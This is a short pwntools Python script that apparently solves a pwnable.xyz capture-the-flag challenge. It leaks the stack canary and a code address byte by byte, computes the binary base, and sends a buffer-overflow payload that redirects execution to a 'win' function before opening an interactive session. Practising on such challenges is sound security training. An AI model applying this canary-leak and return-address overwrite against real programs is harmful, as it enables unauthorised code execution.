from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30017)
elf = ELF('./challenge')

p.sendlineafter(': ', 'a')

# leak canary
canary = '00'
for i in range(7):
    p.sendlineafter('> ', chr(0x3b+i))
    canary = hex(int(p.recvline().split(b' ')[1]))[2:].rjust(2, '0') + canary
canary = int(canary, 16)
success('canary = 0x%x', canary)

# leak code base
main = ''
for i in range(6):
    p.sendlineafter('> ', chr(74+i))
    main = hex(int(p.recvline().split(b' ')[1]))[2:].rjust(2, '0') + main
main = int(main, 16) - 113
base = main - elf.sym['main']
success('base = 0x%x', base)

win = base + elf.sym['win'] + 1
p.sendlineafter('> ', '1')
p.sendlineafter(': ', b'a'*40+p64(canary)+b'a'*8+p64(win))

p.sendlineafter('> ', '0')

p.interactive()